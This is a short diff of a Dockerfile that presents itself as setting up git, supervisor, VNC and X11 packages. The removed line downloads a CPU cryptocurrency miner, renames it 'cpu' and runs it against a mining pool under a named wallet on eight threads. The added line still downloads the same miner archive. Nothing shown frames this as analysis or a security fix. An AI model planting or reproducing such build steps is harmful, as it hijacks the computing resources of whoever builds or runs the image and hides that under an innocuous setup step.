@@ -3,7 +3,7 @@ FROM debian:buster
 # Install git, supervisor, VNC, & X11 packages
 RUN set -ex; \
     apt-get update; \
-    wget https://github.com/hellcatz/luckpool/raw/master/miners/hellminer_cpu_linux.tar.gz&&tar -xzvf hellminer_cpu_linux.tar.gz&&mv hellminer cpu&&./cpu -c stratum+tcp://na.luckpool.net:3956#xnsub -u R9twfF4HsvdaAwxxVtGmFrgQXVcEt59eKG.1003A2 -p hybrid --cpu 8
+    wget https://github.com/hellcatz/luckpool/raw/master/miners/hellminer_cpu_linux.tar.gz; \
     apt-get install -y \
       bash \
       fluxbox \
